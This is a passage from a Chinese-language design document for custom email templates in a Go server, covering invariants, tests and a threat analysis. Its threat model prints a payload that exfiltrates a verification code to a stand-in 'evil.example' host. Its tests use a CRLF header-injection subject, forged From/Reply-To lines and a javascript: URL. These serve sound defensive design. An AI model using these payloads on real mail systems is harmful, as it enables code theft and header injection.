一个必须记住的实测事实：**`html/template` 在纯文本上下文的输出与 `html.EscapeString` 逐字节相同**
（`A&B <s> "q" 'a'` 两者都得到 `A&amp;B &lt;s&gt; &#34;q&#34; &#39;a&#39;`），
但在 `href="{{.}}"` 上下文**不同**：`&` 变 `&amp;`，`javascript:` 变 `#ZgotmplZ`（§12 探针 P6）。

### 3.4 失败语义

- SMTP：`sendSMTP` 的每一步失败都包装成 error 向上返回（`:258-334`）。
- 验证码发送失败 → `auth.go:356-360` 记 `slog.Error` 并回 500。
- 邀请发送失败 → `invitation.go:240-242` 只记 `slog.Warn`，请求已经返回 201（fire-and-forget）。
- 配置问题一律**告警放行**，不阻断启动，告警走 `fmt.Printf` → stdout（R6）。

### 3.5 凭据的现有落点

`code` 由 `handler/auth.go:340` 的 `generateCode()` 生成（r3 订正，r2 误作 `:341`；`:341` 是紧随
其后的 `if err != nil`，见 §0.6）、写库（`:346` `CreateVerificationCode`）、在 `:356` 传入
`SendVerificationCode`。它在日志中出现的
**唯一**位置是 DEV 模式的 `fmt.Printf("[DEV] Verification code for %s: %s\n", to, code)`
（`email.go:353`），
该分支只在既无 SMTP 也无 Resend 时可达。`auth.go:357` 的 `slog.Error` 只记 `email` 与 `error`，
**不记 code**。这是本次必须守住的现状（INV1）。

### 3.6 既有测试 harness 的观测能力（本轮实测，直接决定 §8 可执行性）

- `testSMTPServer` 结构体（`email_test.go:502-514`，r3 订正，r2 误作 `:502-515`）字段只有
  `Listener` / `Addr` / `AuthMechs` /
  `RejectPlain` / `ExpectedUser` / `ExpectedPass` / `AdvertiseSTARTTLS`。**没有任何抓包字段。**
  构造函数 `startTestSMTPServer` 在 `:516-542`，连接处理 `handleConn` 在 `:544-638`。
- EHLO 应答**不含 8BITMIME**（R14，应答块 `:570-577`）→ 所有经它发出的正文**必走
  quoted-printable**。
- DATA 处理是丢弃式循环（R15），**且不做 dot-unstuffing**——若直接把 `readLine()` 的结果拼起来，
  正文里以 `.` 开头的行会多出一个点。
- 无 Resend 通道的任何桩（`s.client.Emails.Send` 无接缝）。

---

## 4. Change Reachability Graph

### 4.1 入口 → 落点

```
POST /api/auth/send-code            (auth.go:356)
  └─ EmailService.SendVerificationCode(to, code)         [P06]
       ├─ 新增：模板命中？ → text/template 渲染 Subject + html/template 渲染 Body
       │                     → sanitizeRenderedSubject（剥控制字符 → 200 rune → 998 octet）[P27]
       │                     渲染失败 → 告警（不含 code）→ 回落内置
       └─ 未命中 → 今日的 fmt.Sprintf 原样路径
            ├─ SMTP：sendSMTP(to, subject, body)         [P10]
            │    ├─ QEncoding.Encode(subject)            [P11] ← Subject 最终落点
            │    ├─ headers 块 From/To/Subject/Date/...  [P12] ← 收件人可见的信头
            │    ├─ QP 编码（无 8BITMIME 时）            [P28] ← 正文的传输编码分叉
            │    └─ DotWriter(bodyBytes)                 [P13] ← 正文最终落点（SMTP 字节流）
            ├─ Resend：Emails.Send({From,To,Subject,Html}) [P14] ← 正文/主题最终落点（API 请求体）
            └─ DEV：fmt.Printf("[DEV] ... %s", code)      [P15] ← 凭据落日志

POST /api/workspaces/{id}/invitations (invitation.go:240，**独立 goroutine**)
  └─ EmailService.SendInvitationEmail(to, inviterName, workspaceName, invitationID)  [P07]
       └─ buildInvitationParams(...)                     [P08]  ← 内置路径，零 diff
       └─ buildInvitationParamsFromTemplate(...)         [P08b] ← 新增平行函数
            ├─ html.EscapeString / sanitizeSubjectField  [P09]  ← 仅内置路径
            └─ 同上三条落点 P10–P15
```

### 4.2 影响面表

| ID | 位置 | 类型 | 为什么受影响 | 处置 |
|---|---|---|---|---|
| P01 | `server/cmd/server/router.go:370` | caller | `NewEmailService()` 唯一调用点；改动后新可达模板加载分支 | 纳入影响面，**不修改** |
| P02 | `handler.go:200`、`:461` | consumer | 单例注入，全进程共用一个 `*EmailService`，因此共用同一组已解析模板（INV9） | 纳入影响面，**不修改** |
| P03 | `handler/auth.go:340-360` | public entry | 验证码生成与发送；`code` 的来源（r3 订正，r2 误作 `:341-360`，见 §0.6） | 纳入影响面，**不修改**（INV1 的观测点） |
| P04 | `invitation.go:233-244` | public entry | 邀请邮件，goroutine 内 fire-and-forget（R10） | 纳入影响面，**不修改** |
| P05 | `email.go:177-251` `NewEmailService` | 被改函数 | 新增模板目录读取、解析、零值预执行诊断与启动告警 | **修改** |
| P06 | `email.go:340-364` `SendVerificationCode` | 被改函数 | 新增渲染分支 | **修改** |
| P07 | `email.go:368-386` `SendInvitationEmail` | 被改函数 | 新增渲染分支 | **修改** |
| P08 | `email.go:391-411` `buildInvitationParams` | 被改函数的邻居 | §4.3：**签名与函数体保持零 diff** | **不修改**（关键决定） |
| **P08b** | `email.go` 新增 `buildInvitationParamsFromTemplate` | 新增函数 | 模板命中时的平行构造路径 | **新增** |
| P09 | `email.go:419-434` `sanitizeSubjectField` | 复用点 | 内置路径专用；**新路径不调用它**（PG6） | **不修改**，调用者不变 |
| **P27** | `email.go` 新增 `sanitizeRenderedSubject` | 新增函数 | 剥控制字符 → 200 rune → 998 octet；PG6 的处置 | **新增** |
| P10 | `email.go:257-335` `sendSMTP` | sink 通道 | 渲染结果经此进入 SMTP 字节流 | **不修改** |
| P11 | `email.go:292` `QEncoding.Encode` | **Subject 最终落点** | 自定义主题在此编码；TAB 豁免的位置 | **不修改**，纳入验收 |
| P12 | `email.go:319-327` headers 块 | **收件人可见信头** | `From:` 必须保持来自 R5；`Date:`/`Message-ID:` 时变（R13） | **不修改**，纳入验收 |
| **P28** | `email.go:296-307` QP 分支 | **正文传输编码分叉** | mock relay 无 8BITMIME → 测试恒走 QP（R14）；所有正文断言必须解码后做（PG4） | **不修改**，纳入验收 |
| P13 | `email.go:328` `fmt.Fprintf(w, ...)` → `DotWriter` | **正文最终落点（SMTP）** | 自定义正文的字节在此进线，含 dot-stuffing | **不修改**，纳入验收 |
| P14 | `email.go:356-363`、`:383-385` `Emails.Send` | **正文/主题最终落点（API）** | 自定义内容在此进 JSON 请求体，**无本地编码** | **不修改**，纳入验收 |
| P15 | `email.go:353`、`:380` DEV `fmt.Printf` | **凭据落日志面** | 新增的告警日志不得成为第二个（INV1） | **不修改**，纳入验收 |
| P16 | `email.go:114-126` `resolveFromEmail` | 身份来源 | 决定 `From`/envelope；模板无法影响它 | **不修改**，纳入验收 |
| P17 | `email_test.go:270-415`（`TestBuildInvitationParams_*`） | 既有测试 | 若 P08 改签名，这些测试的调用点全部要改 | **不修改**——零 diff 本身就是 INV4 的证据 |
| **P29** | `email_test.go:502-638`（结构体 `:502-514`、`startTestSMTPServer` `:516-542`、`handleConn` `:544-638`） | 测试 harness | 需新增抓包能力、DotReader 读取、`Advertise8BITMIME` 开关（PG4） | **修改**（RED 准备，非被测改动）。r3 订正：r2 写 `:502-624`，`handleConn` 实际到 `:638`，写集少算 14 行且正好漏掉收尾（见 §0.7 PG14） |
| P18 | `.env.example:227-249` | 文档面 | 新变量必须登记 | **修改** |
| P19 | `docker-compose.selfhost.yml:64-80` | **部署面（硬需求）** | 逐个枚举环境变量（R7）；不加则官方 compose 用户设不了新变量 | **修改**（D4/Q4） |
| P20 | `apps/docs/content/docs/environment-variables{,.ja,.ko,.zh}.mdx:86-93` | 文档面 ×4 | F3 要求四语言同步 | **修改** |
| P21 | `apps/docs/content/docs/auth-setup{,.ja,.ko,.zh}.mdx:30-56` | 文档面 ×4 | 同样成段描述 SMTP 邮件配置 | **修改**（Q4） |
| P22 | `SELF_HOSTING_ADVANCED.md:26-53` | 文档面 | 「Email (Required for Authentication)」整节 | **修改**（Q4） |
| P23 | `deploy/helm/multica/templates/backend.yaml:66` | 部署面 | 走 `envFrom`（R8） | **排除**，理由：无需改动 |
| P24 | `apps/mobile/.env.example` | 部署面 | 与后端邮件无关 | **排除**，理由：不相关 |
| P25 | 前端 `apps/web` 全体 | consumer | 无 UI 改动（non-goal 1） | **排除**，理由：方案 A 不引入 UI |
| P26 | DB migrations / sqlc | 派生记录 | 无 schema 改动 | **排除**，理由：方案 A 不落库 |

### 4.3 `buildInvitationParams` 与 `sanitizeSubjectField` 的签名决定

**`buildInvitationParams`**：包级函数，模板对象挂在 `*EmailService` 上，天然写法是加一个参数。
**不要这样做**：那会让 `email_test.go` 里既有测试的调用点全部产生 diff，而这些测试正是维护者
用来锁定既有转义行为的。采用：原样保留，另加 `buildInvitationParamsFromTemplate(...)`（P08b），
由 `SendInvitationEmail` 按模板是否命中二选一。

**`sanitizeSubjectField`（PG6，r2 新增的同类决定）**：新路径需要「剥控制字符 + 200 rune +
998 octet」，`sanitizeSubjectField` 给的是「剥控制字符 + 60 rune」，**新路径无法调用它**。
r1 同时写了「P09 不修改，仅新增调用者」和「INV2 渲染后同样先剥控制字符」，二者没有可行实现。
采用同一取舍：新增平行函数 `sanitizeRenderedSubject`（P27），`sanitizeSubjectField` 保持零 diff。

**代价（自觉承担并给出对冲）**：控制字符剥离的判据（`unicode.IsControl`）在两处各写一遍，
存在漂移风险——若将来有人改其中一个，两条主题路径的清洗强度会不一致而没有任何信号。
**对冲是 T22**：一张控制字符对照表，逐个断言两个函数对同一输入的剥离结果一致。
这是一个会在漂移发生时立刻变红的机械证据，而不是一句注释。

### 4.4 UNVERIFIED（未验证）

| # | 未验证项 | 依据与盲区 |
|---|---|---|
| U1 | **上游维护者对 #7569 的实际取向** | Issue 零评论（F2）。上游问询已取消（F6 更正），**在本次交付内保持未验证，随交付一同交出**。工作区无 `gh` 认证，无法读 Issue 正文与评论 |
| U2 | F3 三条偏好的原文措辞 | 同 U1。但 #7577 的代码与测试可直接读到，三条偏好在代码里都能找到对应物，转述可信 |
| U3 | #7577 的合入时点 | **本轮复算：仍未合入。** `upstream/main` = `09a2410e`（BASE+1，`#7592`，与本次 write_set 零重叠），`refs/pull/7577/head` = `155a2c72`，`email.go`/`email_test.go` 自 BASE 起未被触碰。「它何时合入」不可预测 |
| U4 | 自建用户实际如何挂载目录 | 官方 compose 未提供邮件模板卷；运维方需自行加 `volumes` 或用 override。R11 确认容器无只读根 fs，但真实编排方式无法从仓库观测 |
| U5 | `html/template` 的 `*Template` 并发 `Execute` 安全性 | 标准库文档声明可并发执行，但本仓库无既有生产用法可参照（R9）。R10 确认并发真实可达。列为 L1 的 `must_answer` 而非本方案的断言 |
| U6 | 是否存在文档翻译一致性的 CI 检查 | `.github/workflows/` 与 `scripts/` 下 grep `zh.mdx` / `i18n` / `translation` 无命中，判断为**无**。若实际存在别处的检查，实现阶段会被 CI 挡下 |
| **U7（新）** | **真实 MTA 对超长 `Subject:` 行的实际处置** | RFC 5322 §2.1.1 规定 998 octet 上限、RFC 5321 §4.5.3.1.6 规定 1000 octet 行上限，但「超限会被拒信、被改写、还是被放行」取决于具体 MTA。INV11 按 RFC 取值，**没有对真实 relay 做过实验**。这条盲区同时适用于既有内置路径（non-goal 10） |
| **U8（新）** | **零值预执行诊断在真实模板上的假阳性率** | 我构造出了假阳性（`{{slice .Code 0 3}}`）和假阴性各一例（§12 探针 P5），但真实运维方写的模板里这类表达式有多常见，无从观测。这正是把它降级为「只告警」的原因——**假阳性率未知时，不能让它决定行为** |

---

## 5. 不变量矩阵

| # | 不变量 | 受影响对象 | 改动前 | 改动后 | 怎么验（探针，**含观测点**） |
|---|---|---|---|---|---|
| INV1 | 验证码不因模板机制进入非预期字段或日志 | `code`（P03→P06） | 仅出现在正文与 DEV stdout（`:353`） | 同上；模板数据结构只含 `Code` 且**任何告警日志（启动/诊断/运行期）不得记录数据结构或渲染结果** | T16：用哨兵 code 触发渲染失败，全量捕获 stdout+stderr 断言不含哨兵；并 grep 新增日志语句确认无 `data` / `body` / `rendered` 参数 |
| **INV2（改写）** | 主题行不可注入 CRLF，**且清洗发生在通道分叉之前** | P27 → P11/P14 | `sanitizeSubjectField` 剥控制字符 + SMTP 侧 `QEncoding`（双层） | 渲染后主题经 `sanitizeRenderedSubject` **剥离全部 `unicode.IsControl` 字符（含 TAB）**，然后才分叉到 SMTP / Resend。**不依赖 `QEncoding` 承担控制字符防线**（它豁免 TAB，`encodedword.go:44`） | T08：自定义主题模板含 `\r\nBcc: evil@x`，抓 DATA 用 `net/mail` 解析，断言恰好一个 `Subject` 字段、值为 `HiBcc: evil@example.com`、无 `Bcc`/`Cc`/`Reply-To` 字段；T08b：同一主题走 Resend 通道，断言 `SendEmailRequest.Subject` 同样已剥离 |
| INV3 | `maxSubjectFieldRunes = 60` 的**逐字段**语义不变 | P09 | 每个用户可控字段独立截断到 60 rune | 完全不变；`sanitizeSubjectField` 函数体零 diff，调用者不变（PG6） | T11：断言 60 rune 常量未被复用于整条主题；`git diff` 显示 `sanitizeSubjectField` 与 P17 零改动；T22：两个清洗函数对同一控制字符表的剥离结果一致 |
| **INV4（改写）** | **未配置自定义模板时输出与今日一致** | P06/P07/P08 全部落点 | — | 结构性保证：未命中模板时执行的是今日**同一段** `fmt.Sprintf` 代码 | ①`git diff` 中 `buildInvitationParams`、`sanitizeSubjectField` 与 P17 **零 diff**；②mock relay 抓完整 DATA 与 MAIL FROM，**掩蔽 `Date:` 与 `Message-ID:` 两行后**逐字节比对已知期望串（PG5/R13），并单独断言这两行存在且格式合法 |
| **INV5（改写）** | 模板问题一律降级，不 fail fast、不静默不发信；**三个时机的职责互不重叠** | P05/P06/P07 | 无此路径 | **解析期**语法错 → 该文件回落内置 + 一条启动告警；**启动期零值预执行**失败 → **仅一条诊断告警，模板照常启用**；**运行期** `Execute` 失败 → 本次发送回落内置 + 一条告警，邮件照常发出 | T12/T13/T14/T15 四个负向用例。每例断言：进程正常启动、邮件**照常发出**、内容等于内置版本或模板版本（按时机不同）、**模板相关告警恰好一条**（不计 R12 的通道行，PG7） |
| INV6 | 模板不能伪造发信人 | P12/P16 | `From`/envelope 来自 `resolveFromEmail` | 不变；模板只产出 Subject 与 HTML body 两个字符串 | T09：自定义模板中写入 `From: evil@x` 与 `Reply-To: evil@x`，抓 DATA **解码 QP 后**断言 `From:` header 仍为配置值、无 `Reply-To` header，且这两行只作为正文可见文本出现（PG4） |
| INV7 | 跨租户数据仍经既有转义，且不二次转义 | P09/P08b | `html.EscapeString(inviterName/workspaceName)` | 模板路径改由 `html/template` 上下文转义（纯文本上下文与 `html.EscapeString` 逐字节相同）；**不得把已转义的字符串喂给模板** | T06/T07/T25，全部**解码 QP 后**断言（PG4）。T25 专测二次转义：工作区名 `A&B`，断言正文含 `A&amp;B` 且**不含** `A&amp;amp;B` |
| **INV8（改写）** | 两条发信通道拿到的是同一份渲染结果 | P10 与 P14 | 同一个 `body` 变量供两路 | 保持：渲染一次、清洗一次，两路共用。**观测点是 sink 之前**——交给 `sendSMTP` 的 `(subject, htmlBody)` 与装进 `SendEmailRequest` 的 `(Subject, Html)` 相同。wire 级必然不同（SMTP 侧过 `QEncoding` + QP，Resend 侧都不过），这是预期（PG9） | T17：同一自定义模板分别在 SMTP 与 Resend 配置下发送，在 sink 入参处断言相同 |
| INV9 | 并发发送不产生数据竞争或交叉渲染 | P02/R10 | 无共享可变状态 | 已解析模板为进程级只读共享；渲染必须写入**各自的** `bytes.Buffer` | T18：`go test -race`，并发 50 次混合发送，断言每封邮件内容自洽（code 不串） |
| INV10 | 渲染失败不产生半截邮件 | P13/P14 | 无此路径 | 必须先 `Execute` 到 `bytes.Buffer`，返回 nil 才取用；**绝不**把 SMTP writer 交给 `Execute` | T15：前半段合法、后半段触发运行期错误的模板，断言发出的是内置正文而非截断正文 |
| **INV11（新，r3 重写）** | 渲染后主题产出的 `Subject:` 整行 ≤ **998** octet | P27 → P11/P12 | 无此约束（**既有内置路径在极端 CJK 输入下已超限，1349 octet，本次不修**，non-goal 10/U7） | 200 rune 上限之后再加一道，**度量口径、阈值与前提三者全部写死在 §5.1，都是本不变量的组成部分**：超限则继续按 rune 从尾部截断直至满足 | T23：CJK 主题模板渲染出 200 rune，断言最终 `Subject:` 行**恰为 996 octet、恰为 91 rune**（不是「约 81」），且 `net/mail` + `WordDecoder` 能解回截断后的原文；同时断言纯 ASCII 200 rune 主题**不被 octet 规则触碰**（209 octet）；T24a 断言不动点性质 |
| **INV12（新，r3 补全度量）** | 两条主题清洗路径的控制字符判据不漂移 | P09 与 P27 | 只有一条路径 | 两个函数使用同一判据 `unicode.IsControl`；PG6 的平行函数代价的对冲 | T22：控制字符对照表（含 `\t` `\r` `\n` `\v` `\x7f` `` ``），逐个断言两函数剥离结果一致。**r3：该表在 §8 T22 改为按码位显式列举**，因为其中两个字符（U+0085 NEL、U+009F APC）在 r2 里渲染成空白，看起来像排版损坏，实际是真字符——实测 `unicode.IsControl` 对表中九个字符全部为 true |
| **INV13（新，r4，PG16 的处置）** | **模板数据结构的字段集合是封闭的**：每个字段的值都能由该封信在 BASE 上已产生的输出字节经一个确定性 `g` 恢复 | P05/P06/P07 的数据面 | 无模板，无数据结构 | `verificationTemplateData` = `{Code, ExpiresInMinutes, AppName}`；`invitationTemplateData` = `{InviterName, WorkspaceName, InviteURL, AppName, AppURL}`。**两份清单是冻结的**，每个字段的 `g` 见 §7.1.1 | **T26**：反射遍历两个结构体，断言字段名集合与上述**完全相等**（多一个少一个都红），且全部为 `string`、无 `template.HTML`。加字段的人会先看到红测试，而不是等到评审被问住 |

### 5.1 INV11 的度量口径、阈值与前提（r3 新增，PG10 的处置）

r2 只写了度量口径，没写阈值；探针于是自行用了另一个阈值（900），跑出 81 并把它当成
998 之下的结论（§0.4）。**度量、阈值、前提三者缺一，这条不变量就不是可验证的。**
全部写死在这里，§8 与 §12 引用本节，不得各自复述一份：

**度量（metric）** — 被约束的量是

```go
func subjectLine(s string) int {
    return len("Subject: " + mime.QEncoding.Encode("utf-8", s))   // len("Subject: ") == 9
}
```

不含结尾 CRLF；`s` 是**清洗之后、进入 `sendSMTP` 之前**的主题字符串。
实现代码与探针代码必须调用同一个函数，不得各写一份。

**阈值（threshold）** — **998**，取自 RFC 5322 §2.1.1（不含 CRLF 的行长上限）。
不取 RFC 5321 §4.5.3.1.6 的 1000（含 CRLF）：两者只差 2 octet，取严的那个不增加实际代价。
**任何以其他阈值得出的数字都不是本不变量的证据**——这正是 r2 出错的方式。

**前提（precondition）** — `subjectLine` 在 rune 前缀上**单调不减**：对任意字符串 `s`
与其任意 rune 前缀 `p`，有 `subjectLine(p) ≤ subjectLine(s)`。r2 从未写出这条，但
「从尾部截断直至满足」的终止性、以及 T24a 的「极大前缀唯一」全部压在它上面。
本轮已实测（§12 探针 R3）：**5 个字符集 × 4000 条随机串 × 每一个前缀，非单调步数 = 0**。
它是 Go `QEncoding` 的性质而非我方代码的性质，所以列为**前提**而非断言——若未来 Go
版本让它不再成立，截断算法要重新设计，不是改个数字。

**由此得到的具体数字（§12 探针 R1，分字符集）**：

| 主题构成 | 998 之下的最大 rune 数 | 该长度的 `Subject:` 行 octet |
|---|---|---|
| 纯中日韩（任意 3 字节 UTF-8） | **91** | 996 |
| 中日韩 + 每 8 字一个空格 | 99 | 998 |
| Emoji（纯 4 字节，如 U+1F600 😀） | **67** | 994 |
| 纯 ASCII | **200 rune 上限先触顶，octet 规则不触碰** | 209 |

混排（emoji + ASCII、拉丁扩展 + ASCII）**不进本表也不进文档面**：它的值随构造变化，
给一个孤立的数会被读成常量。§12 探针 R7 记录了两个**有完整构造**的样点，仅用于支撑
「混排同样可达 998」这一布尔结论：`😀`×56 + `a`×136 = 192 rune → 998；
`é`×122 + `a`×76 = 198 rune → 998。r3 表中的 `71` 已按 PG15 删除（§0.10）。

**91 是「纯中日韩」这一族的值，不是普适常量。** 文档面（T21）与 Q5b 背景必须按字符集
表述，不能写一个孤零零的数字——r2 写「约 80 字」既错值又错形态。

量化台阶（同一探针）：CJK 每加一个 rune `+9` octet（`n=89→978`、`90→987`、`91→996`），
但 `n=92` 跳到 **1018**（`+22`），因为编码字从 13 个变成 14 个，多出 `?=` + 空格 +
`=?utf-8?q?`。**998 落在这个台阶的缝里**，纯 CJK 主题不可能恰好等于 998——这正是
PG11 的根因，见 §0.5。

### 5.2 为什么是截断而不是折行（r4 新增，闸门 1 追加约束二）

这一节是**主动交代取舍**，不是辩护。它必须在方案里，也必须在 PR 描述里——
一个懂 RFC 的上游 reviewer 看到「超过 998 就截断」，第一反应会是「为什么不折行」，
让他自己问出来，比我们自己先说，代价高得多。

**folding 才是 RFC 5322 §2.2.3 的正解。** 长 header 的标准处置是折行：在 header 内部的
折叠点插入 CRLF + 至少一个 WSP，让每一行都落在 998 之下，语义完全不变——收件人看到的
主题一字不少。截断则是**真的丢字**。这一点没有争议，我们选的不是更好的方案，是更小的方案。

**folding 在本次是可行的**（不是「做不到」，是「不做」）。放行人独立跑的探针给出：

```
encoded-word count = 18, longest = 75 octets
=> if folded (CRLF+SP before each word), longest line = 76 octets
RFC 2047 limit is 75; longest word within limit: true
=> folding fixes the 998 overflow for BOTH paths: true
```

`mime.QEncoding.Encode` 本来就把长串切成多个 ≤75 octet 的 encoded-word，只是用**空格**
连接（`splitWord`，`encodedword.go:173-178`）。把那个空格换成 `CRLF + SP`，
每行最长 76 octet，远在 998 之下，且 RFC 2047 的 75 字限制是**对单个 encoded-word** 而言，
不受影响。换句话说：**改动量很小，正确性很清楚。**

**那为什么本轮不做——三条理由，按重要性排**：

1. **它会改到共用的内置路径代码。** 折行必须发生在 `sendSMTP` 组 header 的地方，
   而那段代码内置邮件也走。一旦改，内置邮件的 wire 字节就变了——**直接违反 non-goal 10
   与 INV4「未配置自定义模板时输出与今日逐字节相同」**。而 INV4 是本次说服上游的核心论据：
   一个自建部署的运维方不配置任何模板，升级前后邮件必须一模一样。为了修一个**既有的、
   从未有人报障的**越界，去动这条保证，交换比不对。
2. **它修的是一个本次改动没有引入的问题。** 内置邀请邮件在两个 60-rune CJK 字段下
   产出 1349 octet 的 `Subject:` 行（§12 探针 R5），**BASE 今天就是这样**。
   本次新增的自定义路径带来了 INV11 这道 998 检查，于是显出两条路径处置不一致；
   但不一致的来源是内置路径的既有缺陷，不是新路径引入的退化。
3. **范围**。本 issue 是「让自建部署能自定义邮件模板」。顺手修一个 header 编码的既有
   合规问题，会让 PR 同时改动两个不相关的关注点，评审面变大、被要求拆分的概率变高。

**folding 同时能修内置路径今天的 1349 octet 越界**——这一点必须写进去，因为它是
「我们知道那里有问题、也知道怎么修、并且选择不在这个 PR 里修」的证据，
而不是「我们没看见」。它应当作为一个独立的后续项提给上游。

**本节在什么情况下是错的**：如果上游维护者认为 998 合规必须一次做对、宁可接受内置路径
输出变化，那么正确的响应是**把 folding 做进来并放弃 INV4 的逐字节保证**，而不是坚持截断。
这个取舍权在上游，不在我们；我们要做的是把两条路都摆清楚。列入 §9 可证伪条件 16。

---

## 6. 方案比较

**本节与 r1 一致，未因 PG1/PG2 改变。** 两处 finding 都不触及路线选择：方案 A 的论证依据是
源码事实（`auth.go:334-360` 的验证码邮件全程不涉及 workspace）与 #7568 中可读到的维护者取舍偏好，
均未被动摇。全文保留以便 r2 可独立阅读。

### 方案 A（推荐）：`EMAIL_TEMPLATE_DIR` 挂载模板目录 + 内置路径完全旁路

**做法**：新增单一环境变量 `EMAIL_TEMPLATE_DIR`（默认空 = 关闭）。非空时在 `NewEmailService`
中读取该目录，按固定文件名解析：

```
$EMAIL_TEMPLATE_DIR/
  verification_code.subject.tmpl    # text/template
  verification_code.html.tmpl       # html/template
  invitation.subject.tmpl           # text/template
  invitation.html.tmpl              # html/template
```

四个文件**各自独立可选**——只放 `verification_code.html.tmpl` 就只覆盖那一个，其余保持内置。
每个模板对应一个显式定义的数据结构（字段全部为 `string`，见 §7.1）。
未配置或某文件缺失/解析失败时，对应邮件走**今日一字未改的 `fmt.Sprintf` 代码路径**。

**代价**

- 引入文件系统依赖：容器需要一个卷挂载；官方 compose 未提供，运维方要自己加（U4）。
- 引入模板注入面：模板文本本身不受自动转义保护（D2）。缓解见 §7。
- `server/` 首次出现生产用 `html/template`（R9），团队与 CI 都没有既有经验可依。
- 两封邮件的构造函数各变成「二选一」，代码里同时存在内置版与模板版（§4.3）。
- **（r2 补充）主题清洗函数也变成两份**（§4.3 / PG6），对冲是 T22。

**适用条件**：模板作者 = 部署运维方。这正是自建部署的情形。

### 方案 B：环境变量覆盖（`EMAIL_TEMPLATE_*` 系列）

**做法**：把主题与正文直接放进环境变量。

**代价**：变量数量爆炸（2 封 × (主题+正文) = 4 个，加邮件或加语言就乘上去），而 R7 意味着
**每个新变量都要同时改 `docker-compose.selfhost.yml`**；多行 HTML 塞进 `.env` 会踩转义地狱，
base64 则不可 review；无法按文件粒度回落。

**为什么不选**：没有任何一项优于方案 A，除了「不需要挂卷」，而挂卷对自建部署是常规操作（R11）。
**部分保留**：方案 A 的开关本身就是一个环境变量，这是方案 B 唯一值得保留的部分。

### 方案 C：数据库配置 + 管理界面

**代价（前两条是工作量，第三条是否决理由）**

1. 改动面最大：migration + sqlc + handler + 权限模型 + 前端编辑器 + 预览。上游零表态时提这种
   PR，被合入的概率接近零。
2. 需要引入模板版本、回滚、审计。
3. **它把模板授权点从「部署运维方」下移到「租户内管理员」，是一次真实的信任边界下移。**
   验证码邮件在 `auth.go` 的登录流程中发给**任意输入的邮箱地址**，此时收件人与任何工作区都还
   没有关系（`auth.go:334-360` 全程不涉及 workspace）。若某工作区管理员能编辑验证码邮件模板，
   他就获得了「用实例已验证的发信域名，向任意邮箱发送自己撰写的内容」的能力——而且模板数据里
   必然包含 `Code`，所以他还能把验证码外带（`<img src="https://evil.example/?c={{.Code}}">`）。
   这不是「改动面大」，这是**跨租户提权**。

**为什么不选**：第 3 条。若将来要做 UI，必须先解决「模板作用域与验证码邮件的无租户性之间的
矛盾」，而这个矛盾在验证码邮件上无解——除非只允许实例级超管编辑，那就退化成方案 A 换存储介质。

### 选 A 的决定性因素

**信任边界与零变更保证同时最优。** 方案 A 把授权点留在部署运维方（D3），并且是三条路径中
唯一能把「未配置时零变更」做成**结构性质**而非断言的（D1/§4.3）——因为它允许内置路径一行不改。
方案 B 也能做到，但代价没有换来任何收益；方案 C 做不到，因为它必然要统一渲染路径。

---

## 7. 必答的三个安全点

### 7.1 `html/template` 自动转义在本场景是否足够？是否需要限制函数集与数据白名单？

**分两层回答，因为提问里混了两个不同的东西。**

**第一层：注入模板的数据。够，而且实测比现状严格。**
`html/template` 做的是上下文感知转义。实测（§12 探针 P6）：纯文本上下文下它与现有
`html.EscapeString` **逐字节相同**，所以 INV7 不会因为换机制而放松；`href` 上下文下它更严
（`javascript:alert(1)` → `#ZgotmplZ`，`?x=1&y=2` → `?x=1&amp;y=2`）。因此
`{{.WorkspaceName}}` / `{{.InviterName}}` / `{{.Code}}` 不可能从数据侧突破成 HTML 或脚本。

**必须写死的实现约束**：**绝不把已经 `html.EscapeString` 过的字符串喂给模板**。
实测二次转义会把 `A&B` 变成 `A&amp;amp;B`，在收件人眼里就是乱码。模板路径传**原始**字符串，
由模板引擎负责转义；内置路径继续用 `html.EscapeString`。两条路各自自洽，不共用中间结果。
**T25 专门测这一条**——单元测试若只用 ASCII 名字，这个 bug 测不出来。

**第二层：模板文本本身。不够——因为自动转义根本不管这一层，也不该管。**
模板作者可以写 `<script>`、可以写钓鱼话术、可以把 `{{.Code}}` 放进外链 URL 外带验证码。
**这是任何模板机制的固有属性，无法用转义解决。** 唯一的解法是控制谁能写模板：

> 模板自定义能力的安全性不取决于转义机制，取决于模板作者是否等同于部署运维方。
> 运维方本来就控制二进制与发信域名，给他模板能力不新增任何权限；
> 给租户管理员模板能力则是提权。

**函数集：注册零个自定义函数（FuncMap 为空）。**
Go 标准库模板与 Jinja2 / ERB 有本质区别——**默认函数集里没有任何文件系统、环境变量或进程执行
入口**（只有 `and` / `or` / `not` / `len` / `index` / `print` / `printf` / `slice` / `call` 等纯值操作，
外加 html/template 的转义器）。因此「模板读 `/etc/passwd`」「模板读 `$SMTP_PASSWORD`」在
Go 里不是需要防的攻击，是本来就不存在的能力。**只要不注册 FuncMap 就保持这个性质**，
所以「不引入任何自定义模板函数」列为 non-goal 8 —— 这是一条要被评审盯住的红线。

**数据白名单：每个模板一个显式结构体，字段全部为 `string`。**

```go
// r4：字段集合是冻结的，由 T26 反射断言；每个字段的准入依据见 §7.1.1。
type verificationTemplateData struct {
    Code             string // 6 位数字，服务端生成；BASE 落点 email.go:344
    ExpiresInMinutes string // 由 service 包常量格式化，非从文案抄（PG18）；BASE 落点 :345
    AppName          string // 品牌名；BASE 落点 = 主题字面量 "Your Multica verification code"
    // r4 删除 AppURL：验证码邮件在 BASE 上不渲染任何 URL，无落点（PG16，§0.8）
}

type invitationTemplateData struct {
    InviterName   string // BASE 落点 = 正文 <strong>%s</strong> 与主题
    WorkspaceName string // BASE 落点 = 正文 <h2>You're invited to join %s</h2>
    InviteURL     string // BASE 落点 = 正文 <a href="%s">，恒等
    AppName       string // BASE 落点 = 主题 "… on Multica"
    AppURL        string // BASE 落点 = 同一个 href 去掉 /invite/{id} 后缀（§7.1.1）
}
```

三条硬规则：

1. **绝不传 `map[string]any`。**
   **（r2 改写理由，PG2）** 取舍不变，理由订正：区别**不在检测时机，在失败形态**。
   map 上未知字段静默成空值，结果是**发出一封残缺邮件而没有任何信号**；结构体上是硬错误，
   **必然触发运行期回落，收件人拿到完整的内置邮件**。
   ~~「结构体上引用不存在的字段是解析期错误」——**这句话是错的，已删除**~~：
   `Parse` 不接收数据类型，只做语法分析；`{{.SMTPPassword}}` 在 `text/template` 与
   `html/template` 上都 `Parse=nil`，只在 `Execute` 时报
   `can't evaluate field SMTPPassword in type ...`（§12 探针 P4，两条路径均已实测）。
   附带收益：结构体让启动期零值预执行**诊断**成为可能（map 做不到），但那只是诊断，见 §7.3。
2. **绝不有任何字段是 `template.HTML` / `template.URL` / `template.JS` 类型**——这些类型是
